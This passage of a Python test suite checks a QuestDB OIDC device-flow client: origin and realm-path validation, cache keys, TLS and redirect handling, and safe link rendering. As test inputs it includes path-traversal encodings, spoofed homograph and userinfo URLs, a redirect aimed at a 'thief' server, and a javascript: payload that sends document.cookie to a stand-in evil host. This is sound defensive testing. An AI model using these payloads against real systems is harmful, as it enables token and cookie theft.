                         'https://h:9000/settings')
        self.assertEqual(_settings_url('https://h:9000/base/#frag'),
                         'https://h:9000/base/settings')

    def test_settings_config_ignores_user_writable_preferences(self):
        # QuestDB /settings nests server-authoritative values under "config"
        # alongside a user-writable "preferences" sibling (the web console
        # persists UI prefs there). Discovery must read only "config", so a user
        # who can write a preference cannot smuggle an acl.oidc.* key in to
        # redirect the device code / refresh token. Ported from the Java client.
        from questdb.auth._discovery import settings_config
        resp = {
            'config': {
                'acl.oidc.client.id': 'questdb',
                'acl.oidc.token.endpoint': 'https://idp.example.com/token'},
            'preferences.version': 0,
            'preferences': {
                'acl.oidc.token.endpoint': 'https://evil.example.com/token'},
        }
        cfg = settings_config(resp)
        self.assertEqual(cfg['acl.oidc.token.endpoint'],
                         'https://idp.example.com/token')
        self.assertNotIn('evil', str(cfg))
        # A structured response (one carrying the user-writable "preferences"
        # sibling) must NOT fall back to trusting the top level when "config" is
        # absent or malformed: read nothing rather than the top level.
        self.assertEqual(
            settings_config({'preferences': {'acl.oidc.token.endpoint': 'x'}}),
            {})
        self.assertEqual(
            settings_config({'config': None,
                             'preferences': {'acl.oidc.client.id': 'x'}}),
            {})
        # A genuinely flat / legacy response (no config/preferences split) is
        # still tolerated at the top level.
        self.assertEqual(settings_config({'acl.oidc.client.id': 'q'}),
                         {'acl.oidc.client.id': 'q'})


class TestEndpointValidation(unittest.TestCase):
    def setUp(self):
        from questdb.auth._discovery import validate_endpoint_origins
        self._validate = validate_endpoint_origins

    def test_default_port_equivalence_accepted(self):
        # https default (443) vs explicit :443 normalize to the same origin.
        self._validate('https://idp/token', 'https://idp:443/device')

    def test_normalized_origin_keeps_explicit_zero_port(self):
        # m6: an explicit :0 must not collapse to the default port (0 is falsy
        # but a real, distinct port value), so it stays a distinct origin rather
        # than aliasing the default. Not exploitable (:0 isn't connectable) — a
        # normalization tidy.
        from questdb.auth._discovery import _normalized_origin
        self.assertEqual(_normalized_origin('https://h:0/x'), ('https', 'h', 0))
        self.assertNotEqual(_normalized_origin('https://h:0/x'),
                            _normalized_origin('https://h/x'))

    def test_ipv6_same_origin_accepted(self):
        self._validate('https://[::1]/token', 'https://[::1]/device')

    def test_off_origin_device_rejected(self):
        with self.assertRaises(OidcConfigError):
            self._validate('https://idp/token', 'https://evil.example/device')

    def test_co_located_endpoints_accepted(self):
        # validate_endpoint_origins now enforces ONLY co-location: the two
        # credential endpoints must share an origin. The issuer-ORIGIN pin for
        # /settings-sourced endpoints moved to resolve_config (where each
        # endpoint's provenance is known), so a caller/discovery endpoint set
        # whose origin differs from the issuer is no longer rejected here — see
        # test_issuer_pin_rejects_off_origin_endpoints (/settings rejection) and
        # test_explicit_cross_origin_issuer_accepted (Google-style acceptance).
        self._validate('https://idp/token', 'https://idp/device')

    def test_explicit_cross_origin_issuer_accepted(self):
        # Google-style IdP: the issuer host differs from the endpoint host
        # (issues from accounts.google.com, serves tokens from
        # oauth2.googleapis.com). Endpoints passed explicitly are authoritative,
        # so a cross-origin issuer must NOT be rejected — the issuer is an OIDC
        # identifier, not necessarily the endpoints' host.
        auth = OidcDeviceAuth(
            client_id='questdb',
            token_endpoint='https://oauth2.googleapis.com/token',
            device_authorization_endpoint=
                'https://oauth2.googleapis.com/device/code',
            issuer='https://accounts.google.com',
            renderer=Renderer())
        self.assertEqual(auth.config.token_endpoint,
                         'https://oauth2.googleapis.com/token')

    def test_malformed_port_raises_config_error(self):
        # A non-integer port must surface as OidcConfigError, not urllib's bare
        # ValueError (which callers catching OidcError would miss). See M6.
        with self.assertRaises(OidcConfigError):
            self._validate('https://idp:notaport/token',
                           'https://idp:notaport/device')

    def test_malformed_ipv6_endpoint_raises_config_error(self):
        # A malformed IPv6 literal makes urllib.parse.urlparse() itself raise
        # ValueError (before .port is read); it must surface as OidcConfigError,
        # not a bare ValueError escaping the typed-error contract. See M1.
        with self.assertRaises(OidcConfigError):
            self._validate('https://[::1', 'https://[::1')
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth(
                client_id='questdb',
                device_authorization_endpoint='https://[::1',
                token_endpoint='https://[::1',
                renderer=Renderer())

    def test_explicit_constructor_enforces_co_location(self):
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth(
                client_id='questdb',
                device_authorization_endpoint='https://idp.example.com/device',
                token_endpoint='https://attacker.example/token',
                renderer=Renderer())

    def test_endpoint_path_under_issuer(self):
        # M1: segment-aware path containment used to isolate path-based realms.
        from questdb.auth._discovery import _endpoint_path_under_issuer as under
        iss = 'https://idp.example.com/realms/prod'
        self.assertTrue(under(iss + '/protocol/openid-connect/token', iss))
        self.assertTrue(under(iss, iss))                       # exact path
        self.assertTrue(under(iss + '/', iss))                 # trailing slash
        self.assertFalse(under('https://idp.example.com/realms/EVIL/token', iss))
        self.assertFalse(  # not a *segment* prefix: prod != production
            under('https://idp.example.com/realms/production/token', iss))
        # A root issuer (no path) constrains the origin only -> any path is in.
        self.assertTrue(
            under('https://idp.example.com/anything', 'https://idp.example.com'))
        self.assertTrue(
            under('https://idp.example.com/x', 'https://idp.example.com/'))
        # A '.' / '..' segment (even percent-encoded) is rejected: urllib sends
        # the dotted path verbatim and the IdP / proxy normalizes it to a
        # DIFFERENT realm, which an origin check can't catch.
        self.assertFalse(under(iss + '/../EVIL/protocol/token', iss))
        self.assertFalse(under(iss + '/%2e%2e/EVIL/token', iss))
        self.assertFalse(under(iss + '/./token', iss))
        # Encodings/escapes the old decode-once-then-compare-raw check let
        # through (M4): a server that unescapes more than once, folds a
        # backslash to '/', or normalizes the last segment's ;params would
        # resolve these to a DIFFERENT realm, so they must be rejected too.
        self.assertFalse(under(iss + '/%252e%252e/EVIL/token', iss))   # 2x-enc
        self.assertFalse(under(iss + '/..\\EVIL/token', iss))          # backslash
        self.assertFalse(under(iss + '/token;..%2f..%2fEVIL', iss))    # ;params
        # A ;-matrix param or trailing whitespace in a NON-last segment: urllib
        # only splits the FINAL segment's ;params off .path, so an inner '..;' /
        # '..\t' stays a literal segment. A proxy in the '..;/' traversal class
        # (Tomcat/Undertow) strips the param / trims the segment before
        # normalizing and resolves these to a DIFFERENT realm, so they must be
        # rejected too (regression test for the inner-segment path-pin bypass).
        self.assertFalse(under(iss + '/..;/EVIL/protocol/token', iss))  # ..;
        self.assertFalse(under(iss + '/%2e%2e;/EVIL/token', iss))       # enc ..;
        self.assertFalse(under(iss + '/..%09/EVIL/token', iss))         # ..<tab>
        # A dot segment wrapped in MORE encoding layers than the bounded decode
        # loop peels leaves a residual '%'; a server that decodes it further
        # would resolve to a DIFFERENT realm, so a segment that did not fully
        # decode is rejected (fail closed).
        enc_dot = '%' + '25' * 11 + '2e'      # a single '.' wrapped in 12 layers
        self.assertFalse(under(f'{iss}/{enc_dot}{enc_dot}/EVIL/token', iss))
        # A legitimate sub-path with a (non-traversal) percent-escape or matrix
        # param is still accepted — only dot traversal is rejected.
        self.assertTrue(under(iss + '/some%20path/token', iss))
        self.assertTrue(under(iss + '/token;jsessionid=abc', iss))
        # A NUL (or any other C0 control / DEL) in a segment is rejected (m7):
        # it survives _strip_matrix_params (str.strip trims only whitespace
        # controls), so "..%00" decodes to '..\x00' (not literally '..') and
        # would slip the dot-check — but a NUL-truncating or control-stripping
        # proxy/server resolves it back to '..' and reaches a different realm.
        self.assertFalse(under(iss + '/..%00/EVIL/token', iss))      # ..NUL
        self.assertFalse(under(iss + '/%2e%2e%00/EVIL/token', iss))  # enc ..NUL
        self.assertFalse(under(iss + '/..%01/EVIL/token', iss))      # ..C0
        self.assertFalse(under(iss + '/..%7f/EVIL/token', iss))      # ..DEL
        # A printable-ASCII segment with an internal space (%20) is still fine.
        self.assertTrue(under(iss + '/ok%20name/token', iss))


class TestCacheKey(unittest.TestCase):
    def _auth(self, **kw):
        opts = dict(
            client_id='questdb',
            device_authorization_endpoint='https://idp.example.com/device',
            token_endpoint='https://idp.example.com/token',
            scope='openid groups', groups_in_token=True,
            renderer=Renderer())
        opts.update(kw)
        return OidcDeviceAuth(**opts)

    def test_normalize_url_malformed_port_raises_config_error(self):
        # cache_key normalization shares the same typed-port guard: a malformed
        # port raises OidcConfigError, not a bare ValueError. See M6.
        from questdb.auth._device import _normalize_url
        with self.assertRaises(OidcConfigError):
            _normalize_url('https://idp:notaport/token')

    def test_normalize_url_malformed_ipv6_raises_config_error(self):
        # cache_key normalization must also map a malformed IPv6 literal (which
        # makes urlparse itself raise) to OidcConfigError, not a bare
        # ValueError. See M1.
        from questdb.auth._device import _normalize_url
        with self.assertRaises(OidcConfigError):
            _normalize_url('https://[::1')

    def test_realm_path_distinguishes_key(self):
        # Multi-tenant IdP: same host, different realm path -> distinct keys
        # (the old origin-only key collided, leaking one realm's token).
        a = self._auth(
            token_endpoint='https://idp.example.com/realmA/token',
            device_authorization_endpoint='https://idp.example.com/realmA/dev')
        b = self._auth(
            token_endpoint='https://idp.example.com/realmB/token',
            device_authorization_endpoint='https://idp.example.com/realmB/dev')
        self.assertNotEqual(a.cache_key, b.cache_key)

    def test_scope_order_does_not_change_key(self):
        self.assertEqual(
            self._auth(scope='openid groups').cache_key,
            self._auth(scope='groups openid').cache_key)

    def test_audience_distinguishes_key(self):
        self.assertNotEqual(
            self._auth(audience='aud-1').cache_key,
            self._auth(audience='aud-2').cache_key)

    def test_default_port_normalized(self):
        self.assertEqual(
            self._auth(token_endpoint='https://idp.example.com/token').cache_key,
            self._auth(
                token_endpoint='https://idp.example.com:443/token').cache_key)

    def test_issuer_trailing_slash_and_case_do_not_change_key(self):
        # A discovered issuer often carries a trailing slash ("https://idp/")
        # while an explicit one does not ("https://idp"); case and a default :443
        # likewise vary. None of these change the security context, so they must
        # not split the cache key and force an avoidable re-prompt.
        base = self._auth(issuer='https://idp.example.com')
        for variant in ('https://idp.example.com/',
                        'https://IDP.example.com',
                        'https://idp.example.com:443',
                        'https://idp.example.com:443/'):
            self.assertEqual(base.cache_key,
                             self._auth(issuer=variant).cache_key, variant)

    def test_issuer_realm_path_distinguishes_key(self):
        # A different realm PATH on the same host is a different issuer and must
        # stay a distinct key — origin-only normalization would wrongly collide
        # them.
        self.assertNotEqual(
            self._auth(
                issuer='https://idp.example.com/realms/prod').cache_key,
            self._auth(
                issuer='https://idp.example.com/realms/staging').cache_key)

    def test_groups_in_token_distinguishes_key(self):
        # groups_in_token selects which token kind _select returns, so two
        # sessions differing ONLY in that mode must not collide on one cache
        # entry (and evict each other). scope already has 'openid' here, so the
        # keys can differ only by the mode.
        self.assertNotEqual(
            self._auth(groups_in_token=True).cache_key,
            self._auth(groups_in_token=False).cache_key)


class TestTransportSecurity(unittest.TestCase):
    def test_require_secure_policy(self):
        from questdb.auth._http import _require_secure
        # https is always fine.
        _require_secure('https://idp.example.com/x', insecure=False)
        # loopback http never leaves the host -> always allowed.
        _require_secure('http://127.0.0.1:9000/x', insecure=False)
        _require_secure('http://localhost/x', insecure=False)
        _require_secure('http://[::1]:8080/x', insecure=False)
        # non-loopback http is refused unless insecure is explicitly set.
        with self.assertRaises(OidcConfigError):
            _require_secure('http://idp.example.com/x', insecure=False)
        _require_secure('http://idp.example.com/x', insecure=True)

    def test_post_form_attaches_status_to_non_json_error(self):
        # The device-flow poll loop and the silent refresh classify a non-JSON
        # token-endpoint failure (4xx terminal vs 5xx/429 transient) by the HTTP
        # status, so post_form must attach it to the raised OidcError. M1/M2.
        from questdb.auth._http import post_form
        with _raw_response_server(403, 'text/plain', b'forbidden') as raw:
            with self.assertRaises(OidcError) as cm:
                post_form(raw + '/token', {'grant_type': 'x'})
        self.assertEqual(cm.exception.status, 403)
        # A non-JSON 5xx likewise carries its status (classified as transient).
        with _raw_response_server(503, 'text/html', b'<h1>bad gw</h1>') as raw:
            with self.assertRaises(OidcError) as cm:
                post_form(raw + '/token', {'grant_type': 'x'})
        self.assertEqual(cm.exception.status, 503)

    def test_incomplete_error_body_maps_to_network_error(self):
        # A 4xx/5xx with a truncated CHUNKED body (the server announces a chunk,
        # sends fewer bytes, then closes) makes the error-body read raise
        # http.client.IncompleteRead — an HTTPException, NOT an OSError. The poll
        # loop drives many 4xx during sign-in, so this must map to a typed
        # OidcNetworkError, not escape raw (mirrors the success path's handler).
        # See M3.
        import http.client
        from questdb.auth import _http
        self.assertFalse(issubclass(http.client.IncompleteRead, OSError))

        class _ChunkedTrunc(http.server.BaseHTTPRequestHandler):
            protocol_version = 'HTTP/1.1'  # chunked transfer needs HTTP/1.1

            def log_message(self, *a):
                pass

            def do_GET(self):
                self.send_response(400)
                self.send_header('Transfer-Encoding', 'chunked')
                self.end_headers()
                self.wfile.write(b'64\r\n')   # announce a 0x64 = 100-byte chunk
                self.wfile.write(b'short')     # send only 5 of them, then close
                self.wfile.flush()
                self.close_connection = True

        srv = http.server.HTTPServer(('127.0.0.1', 0), _ChunkedTrunc)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            with self.assertRaises(OidcNetworkError):
                _http.request(
                    'GET', f'http://127.0.0.1:{srv.server_port}/x', timeout=5)
        finally:
            srv.shutdown()
            srv.server_close()

    def test_insecure_does_not_downgrade_idp(self):
        # insecure=True must NOT permit plaintext to a non-loopback IdP: the
        # device code / refresh token must never traverse the network in clear.
        auth = OidcDeviceAuth(
            client_id='questdb',
            device_authorization_endpoint='http://idp.example.com/device',
            token_endpoint='http://idp.example.com/token',
            scope='openid', groups_in_token=False,
            insecure=True, interactive=True, renderer=Renderer(),
            _clock=FakeClock())
        with self.assertRaises(OidcConfigError):
            auth.token()

    def test_redirects_are_not_followed(self):
        # A 30x must NOT be followed: urllib would otherwise re-send the
        # Authorization: Bearer header (and downgrade to plaintext http) to the
        # redirect target, leaking the QuestDB token off-origin (only the
        # original URL is vetted, never the redirect target). The redirect must
        # surface as a non-2xx response, and the off-origin host must never be
        # contacted. See C1.
        from questdb.auth import _http

        seen = []

        class _Redir(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def do_GET(self):
                seen.append((self.path, self.headers.get('Authorization')))
                if self.path == '/exec':
                    self.send_response(302)
                    self.send_header('Location', attacker + '/stolen')
                    self.end_headers()
                else:
                    self.send_response(200)
                    self.send_header('Content-Length', '2')
                    self.end_headers()
                    self.wfile.write(b'{}')

        victim = http.server.HTTPServer(('127.0.0.1', 0), _Redir)
        thief = http.server.HTTPServer(('127.0.0.1', 0), _Redir)
        attacker = f'http://127.0.0.1:{thief.server_port}'
        for srv in (victim, thief):
            threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            resp = _http.request(
                'GET', f'http://127.0.0.1:{victim.server_port}/exec',
                headers={'Authorization': 'Bearer SECRET'}, timeout=5)
        finally:
            for srv in (victim, thief):
                srv.shutdown()
                srv.server_close()

        # The redirect surfaced as a non-2xx response, was not followed, and the
        # off-origin target never saw the request (or the bearer token).
        self.assertEqual(resp.status, 302)
        self.assertEqual(seen, [('/exec', 'Bearer SECRET')])

    def test_malformed_url_raises_config_error(self):
        # A non-integer port must surface as OidcConfigError, not a raw
        # http.client.InvalidURL escaping the typed-error contract — this is the
        # path the QuestDB /settings / discovery fetches go through. See M3.
        from questdb.auth._http import request
        with self.assertRaises(OidcConfigError):
            request('GET', 'https://questdb.example.com:notaport/settings',
                    timeout=5)

    def test_require_secure_rejects_malformed_ipv6(self):
        # _require_secure routes through safe_urlparse, so a malformed IPv6
        # endpoint raises OidcConfigError instead of a bare ValueError (urlparse
        # raises before the scheme is even inspected). See M1.
        from questdb.auth._http import _require_secure
        with self.assertRaises(OidcConfigError):
            _require_secure('https://[::1', insecure=False)
        # A well-formed IPv6 URL is still accepted (loopback http is allowed).
        _require_secure('http://[::1]:8080/x', insecure=False)

    def test_read_body_accepts_normal_body(self):
        from questdb.auth._http import _read_body
        resp = _ChunkStream(b'hello ', b'world')
        self.assertEqual(
            _read_body(resp, max_bytes=1000, deadline=1e18), b'hello world')

    def test_read_body_rejects_oversized(self):
        # A body over the cap raises instead of buffering unbounded into memory.
        from questdb.auth._http import _read_body
        resp = _ChunkStream(b'x' * 60, b'y' * 60)   # 120 bytes > 100-byte cap
        with self.assertRaises(OidcNetworkError):
            _read_body(resp, max_bytes=100, deadline=1e18)

    def test_read_body_aborts_on_slow_dribble(self):
        # A steady dribble that never trips the per-read socket timeout must
        # still abort once the whole-read wall-clock deadline passes — the gap
        # urllib's per-operation timeout leaves open.
        from questdb.auth import _http
        body = _ChunkStream(*([b'a'] * 10000))       # endless trickle
        ticks = iter([0.0, 0.2, 0.4, 2.0])           # advance past deadline=1.0
        with mock.patch.object(_http, '_monotonic',
                               lambda: next(ticks, 100.0)):
            with self.assertRaises(OidcNetworkError):
                _http._read_body(body, max_bytes=10 ** 9, deadline=1.0)

    def test_read_body_aborts_real_socket_dribble(self):
        # Regression for M1, against the REAL socket stack (the _ChunkStream
        # unit test above cannot catch this — the mock defines read() itself).
        # A real http.client response's read(n) blocks until n bytes are
        # buffered, so a server dribbling one byte per socket-timeout window
        # would keep a single read(_READ_CHUNK) blocked forever and the
        # wall-clock deadline (checked only between reads) would never fire.
        # _read_body must read via read1() so each read returns after one
        # socket read and the deadline is honored; this would hang the calling
        # thread (which holds the acquisition lock) before the fix.
        import socket
        from questdb.auth import _http

        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('127.0.0.1', 0))
        srv.listen(1)
        port = srv.getsockname()[1]
        stop = threading.Event()

        def serve():
            try:
                conn, _ = srv.accept()
            except OSError:
                return
            try:
                conn.recv(65536)  # consume the request line/headers
                # Announce a large body, then dribble it one byte at a time,
                # each well inside the per-socket timeout window so urllib's
                # per-read timeout never fires.
                conn.sendall(
                    b'HTTP/1.1 200 OK\r\n'
                    b'Content-Type: application/json\r\n'
                    b'Content-Length: 1000000\r\n\r\n')
                while not stop.is_set():
                    try:
                        conn.sendall(b'a')
                    except OSError:
                        break
                    stop.wait(0.1)
            finally:
                conn.close()

        server_thread = threading.Thread(target=serve, daemon=True)
        server_thread.start()

        result = {}

        def call():
            try:
                _http.request(
                    'GET', f'http://127.0.0.1:{port}/x', timeout=1.0)
                result['returned'] = True
            except Exception as e:  # noqa: BLE001 - record for the assert below
                result['error'] = e

        t = threading.Thread(target=call, daemon=True)
        t.start()
        t.join(8.0)
        hung = t.is_alive()            # capture before cleanup unblocks it
        stop.set()
        srv.close()
        server_thread.join(2.0)

        self.assertFalse(
            hung,
            'request() hung on a dribbling server: the whole-read wall-clock '
            'deadline never fired (M1 regression — _read_body must read via '
            'read1()).')
        self.assertIsInstance(result.get('error'), OidcNetworkError)

    def test_bad_ca_bundle_raises_config_error(self):
        # A missing or invalid CA bundle path (explicit or via env) must surface
        # as OidcConfigError, not a raw FileNotFoundError / ssl.SSLError. See M1.
        import tempfile
        from questdb.auth._http import build_ssl_context
        with self.assertRaises(OidcConfigError):
            build_ssl_context('/no/such/path/ca.pem')
        with tempfile.NamedTemporaryFile('w', suffix='.pem', delete=False) as f:
            f.write('not a certificate')
            bad = f.name
        try:
            with self.assertRaises(OidcConfigError):
                build_ssl_context(bad)
        finally:
            os.unlink(bad)

    def test_deeply_nested_json_raises_oidc_error(self):
        # A RecursionError from json.loads (a deeply-nested JSON body exhausts
        # the decoder's stack) must be mapped to OidcError, not escape the
        # typed-error contract. The depth at which json actually raises is a
        # Python-version detail — the C scanner ignores sys.setrecursionlimit,
        # and 3.14 parses far deeper than 3.13, so a fixed-depth body no longer
        # raises there — so inject the RecursionError directly to test the
        # mapping deterministically across versions. See M1.
        from questdb.auth import _http
        with _raw_response_server(
                    200, 'application/json', b'{"ok": true}') as base, \
                mock.patch.object(
                    _http.json, 'loads',
                    side_effect=RecursionError('nesting too deep')):
            with self.assertRaises(OidcError):
                _http.get_json(base + '/x', timeout=5)
            with self.assertRaises(OidcError):
                _http.post_form(base + '/x', {'a': 'b'}, timeout=5)

    def test_post_form_non_json_2xx_raises_oidc_error(self):
        # A 2xx body from the token/device endpoint that isn't JSON (e.g. an
        # HTML login page from a proxy in front of the IdP) must surface as
        # OidcError, not a raw decoder error. Only /exec had this before. M4.
        from questdb.auth import _http
        with _raw_response_server(200, 'text/html', b'<html>login</html>') as b:
            with self.assertRaises(OidcError):
                _http.post_form(b + '/token', {'a': 'b'}, timeout=5)

    def test_post_form_non_dict_json_raises_oidc_error(self):
        # A JSON array (valid JSON but not an object) from the token endpoint
        # must surface as OidcError WITH the HTTP status attached, so the poll
        # loop can tell a terminal 4xx from a transient/2xx instead of polling on
        # to a misleading "code expired". See M4 / review m1.
        from questdb.auth import _http
        with _raw_response_server(200, 'application/json', b'[1, 2, 3]') as b:
            with self.assertRaises(OidcError) as cm:
                _http.post_form(b + '/token', {'a': 'b'}, timeout=5)
            self.assertEqual(cm.exception.status, 200)
        with _raw_response_server(400, 'application/json', b'["nope"]') as b:
            with self.assertRaises(OidcError) as cm:
                _http.post_form(b + '/token', {'a': 'b'}, timeout=5)
            self.assertEqual(cm.exception.status, 400)

    def test_get_json_non_2xx_raises_oidc_error(self):
        # A non-2xx /settings or discovery response must surface as OidcError.
        # See M4.
        from questdb.auth import _http
        with _raw_response_server(500, 'text/plain', b'boom') as b:
            with self.assertRaises(OidcError):
                _http.get_json(b + '/settings', timeout=5)

    def test_get_json_non_json_2xx_raises_oidc_error(self):
        # A 2xx /settings or discovery body that isn't JSON must surface as
        # OidcError, not a raw JSONDecodeError. See M4.
        from questdb.auth import _http
        with _raw_response_server(200, 'text/html', b'<html>x</html>') as b:
            with self.assertRaises(OidcError):
                _http.get_json(
                    b + '/.well-known/openid-configuration', timeout=5)


class TestRendererSecurity(unittest.TestCase):
    """The Jupyter prompt must never turn an IdP-supplied URL into a
    clickable/executable link unless it uses an http(s) scheme."""

    def test_safe_link_url_allowlist(self):
        from questdb.auth._render import _safe_link_url
        self.assertEqual(_safe_link_url('https://idp/x'), 'https://idp/x')
        self.assertEqual(_safe_link_url('http://idp/x'), 'http://idp/x')
        self.assertEqual(_safe_link_url('HTTPS://idp/x'), 'HTTPS://idp/x')
        for bad in ('javascript:alert(1)', 'data:text/html,x',
                    'vbscript:x', 'file:///etc/passwd', '', None):
            self.assertIsNone(_safe_link_url(bad))
        # Surrounding whitespace is trimmed: urlparse ignores it when parsing the
        # scheme, so the value we return (and hand to the href / browser) must be
        # the trimmed one, not the untrimmed original.
        self.assertEqual(
            _safe_link_url('  https://idp.example.com/x  '),
            'https://idp.example.com/x')

    def test_safe_link_url_rejects_userinfo_and_confusable_host(self):
        # M2: an http(s) URL that could MISREPRESENT its destination host must
        # not be made clickable / auto-opened — embedded userinfo (reads as the
        # trusted host, connects past the '@'), or a non-ASCII confusable /
        # control char in the authority. Such a URL is shown as inert text
        # instead. Defeating a host-spoof the scheme allowlist alone misses.
        from questdb.auth._render import _safe_link_url
        spoofs = [
            'https://login.questdb.io@evil.example/device',     # userinfo
            'https://idp.example.com@evil/device?user_code=X',  # userinfo
            'https://evil.example／login.questdb.io/auth',  # fullwidth solidus
            'https://qоestdb.io/device',                   # Cyrillic homograph
            'https://idp.example.com\x00/device',               # NUL in authority
        ]
        for url in spoofs:
            self.assertIsNone(_safe_link_url(url), f'should reject {url!r}')
        # Legitimate targets (DNS, explicit port, loopback, IPv6, punycode IDN)
        # still pass — the host gate must not over-block the happy path.
        for url in (
                'https://idp.example.com/device',
                'https://idp.example.com:8443/device?user_code=WDJB-MJHT',
                'http://127.0.0.1:9000/device',
                'https://[::1]:8080/device',
                'https://xn--nxasmm1c.example/device',
                'https://accounts.google.com/o/oauth2/device/code'):
            self.assertEqual(_safe_link_url(url), url, f'should accept {url!r}')

    def test_render_link_inert_for_dangerous_scheme(self):
        from questdb.auth._render import _render_link
        safe = _render_link('https://idp/x')
        self.assertIn('<a href="https://idp/x"', safe)
        evil = _render_link('javascript:alert(document.cookie)')
        self.assertNotIn('<a ', evil)
        self.assertNotIn('href', evil)

    def test_jupyter_prompt_never_emits_dangerous_href(self):
        from questdb.auth._render import JupyterRenderer

        captured = {}

        class _Capturing(JupyterRenderer):
            def _display(self, html_str):  # avoid importing IPython
                captured['html'] = html_str

        # A hostile/MITM'd device response.
        _Capturing().on_prompt({
            'user_code': 'WDJB-MJHT',
            'verification_uri': 'javascript:fetch("//evil/?c="+document.cookie)',
            'verification_uri_complete': 'data:text/html,<script>x</script>',
            'expires_in': 600, 'interval': 5,
        })
        html_out = captured['html'].lower()
        self.assertNotIn('<a ', html_out)            # no clickable link at all
        self.assertNotIn('href="javascript', html_out)
        self.assertNotIn('href="data:', html_out)

        # A legitimate https URL still renders as a clickable link.
        captured.clear()
        _Capturing().on_prompt({
            'user_code': 'WDJB-MJHT',
            'verification_uri': 'https://idp.example.com/device',
            'expires_in': 600, 'interval': 5,
        })
        self.assertIn('<a href="https://idp.example.com/device"',
                      captured['html'])

    def test_jupyter_qr_suppressed_for_dangerous_url(self):
        # With qr=True, a dangerous (javascript:/data:) verification URL must NOT
        # produce a QR <img>: the data-URI is gated on _safe_link_url before
        # qrcode is ever called. Holds whether or not the optional qrcode dep is
        # installed (a dangerous URL never reaches the encoder).
        from questdb.auth._render import JupyterRenderer
        captured = {}

        class _Capturing(JupyterRenderer):
            def _display(self, html_str):
                captured['html'] = html_str

        _Capturing(qr=True).on_prompt({
            'user_code': 'X', 'verification_uri': 'javascript:alert(1)',
            'expires_in': 600, 'interval': 5})
        self.assertNotIn('<img', captured['html'].lower())

    def test_jupyter_qr_persists_across_rerenders(self):
        # M2: the QR <img> is built in the shared _prompt_head, so it survives
        # EVERY re-render. on_waiting fires on the first poll tick and used to
        # wipe it (the countdown re-render dropped the QR), leaving qr=True
        # effectively dead in Jupyter. Stub qrcode so this is deterministic
        # whether or not the optional dep is installed.
        import re
        from questdb.auth._render import JupyterRenderer
        renders = []

        class _Capturing(JupyterRenderer):
            def _display(self, html_str):
                renders.append(html_str)

        fake_qrcode = types.ModuleType('qrcode')

        def _make(data):
            class _Img:
                def save(self, buf, format=None):
                    buf.write(b'\x89PNG' + data.encode())
            return _Img()
        fake_qrcode.make = _make

        with mock.patch.dict(sys.modules, {'qrcode': fake_qrcode}):
            r = _Capturing(qr=True)
            r.on_prompt({
                'user_code': 'WDJB-MJHT',
                'verification_uri': 'https://idp.example.com/device',
                'verification_uri_complete':
                    'https://idp.example.com/device?user_code=WDJB-MJHT',
                'expires_in': 600, 'interval': 5})
            r.on_waiting(120.0)   # the first countdown tick — used to drop the QR
            r.on_success('alice@example.com', 3600)

        self.assertEqual(len(renders), 3)
        self.assertTrue(
            all('<img alt="QR code"' in h for h in renders),
            'QR <img> must persist across on_prompt / on_waiting / on_success')
        # The PNG is generated once and reused (same data-URI on every render).
        uris = [re.search(r'src="(data:[^"]+)"', h).group(1) for h in renders]
        self.assertEqual(len(set(uris)), 1)

    def test_fmt_mmss(self):
        from questdb.auth._render import _fmt_mmss
        self.assertEqual(_fmt_mmss(0), '0:00')
        self.assertEqual(_fmt_mmss(5), '0:05')
        self.assertEqual(_fmt_mmss(65), '1:05')
        self.assertEqual(_fmt_mmss(600), '10:00')
        self.assertEqual(_fmt_mmss(-5), '0:00')      # clamped, never negative
        self.assertEqual(_fmt_mmss(125.9), '2:05')   # truncates seconds

    def test_fmt_mmss_handles_non_finite(self):
        # A non-finite remaining time (inf/nan) must not crash _fmt_mmss with an
        # OverflowError/ValueError from int(); it degrades to 0:00. Unreachable in
        # practice (callers clamp to a finite value) — defense-in-depth. M5.
        from questdb.auth._render import _fmt_mmss
        self.assertEqual(_fmt_mmss(float('inf')), '0:00')
        self.assertEqual(_fmt_mmss(float('nan')), '0:00')
        self.assertEqual(_fmt_mmss(float('-inf')), '0:00')

    def test_jupyter_second_signin_creates_new_display(self):
        # A second sign-in on the SAME renderer (e.g. after clear() then token())
        # must create a FRESH display in the current cell, not .update() the
        # previous sign-in's output area: on_prompt resets the display handle. M3.
        from questdb.auth._render import JupyterRenderer
        events = []

        class _Cap(JupyterRenderer):
            def _display(self, html_str):
                # Mimic IPython: create when handle is None, else update in place.
                if self._handle is None:
                    self._handle = object()
                    events.append('create')
                else:
                    events.append('update')

        r = _Cap()
        resp = {'user_code': 'A', 'verification_uri': 'https://idp/d',
                'expires_in': 600, 'interval': 5}
        r.on_prompt(resp)            # first sign-in -> create
        r.on_waiting(120.0)          # same sign-in -> update in place
        r.on_success('alice', 3600)  # same sign-in -> update in place
        r.on_prompt(resp)            # SECOND sign-in -> must create afresh
        self.assertEqual(events, ['create', 'update', 'update', 'create'])

    def test_terminal_qr_suppressed_for_dangerous_url(self):
        # With qr=True, a dangerous (javascript:/data:) verification URL must NOT
        # be encoded into a terminal QR: the target is scheme-vetted via
        # _safe_link_url before qrcode is ever called, mirroring the Jupyter QR.
        # Holds whether or not the optional qrcode dep is installed. M4.
        import io
        from questdb.auth._render import TerminalRenderer
        invoked = {'n': 0}
        fake_qrcode = types.ModuleType('qrcode')

        class _QR:
            def __init__(self, *a, **k):
                invoked['n'] += 1

            def add_data(self, *a):
                pass

            def make(self, *a, **k):
                pass

            def print_ascii(self, *a, **k):
                pass

        fake_qrcode.QRCode = _QR
        with mock.patch.dict(sys.modules, {'qrcode': fake_qrcode}):
            TerminalRenderer(stream=io.StringIO(), qr=True).on_prompt({
                'user_code': 'X', 'verification_uri': 'javascript:alert(1)',
                'expires_in': 600, 'interval': 5})
        self.assertEqual(invoked['n'], 0)  # qrcode never reached for a bad URL

    def test_terminal_qr_rendered_for_safe_url(self):
        # The flip side: a legitimate https verification URL with qr=True IS
        # encoded and written to the terminal — the scheme gate must not
        # over-block the happy path. Stub qrcode so this is deterministic. M4.
        import io
        from questdb.auth._render import TerminalRenderer
        fake_qrcode = types.ModuleType('qrcode')

        class _QR:
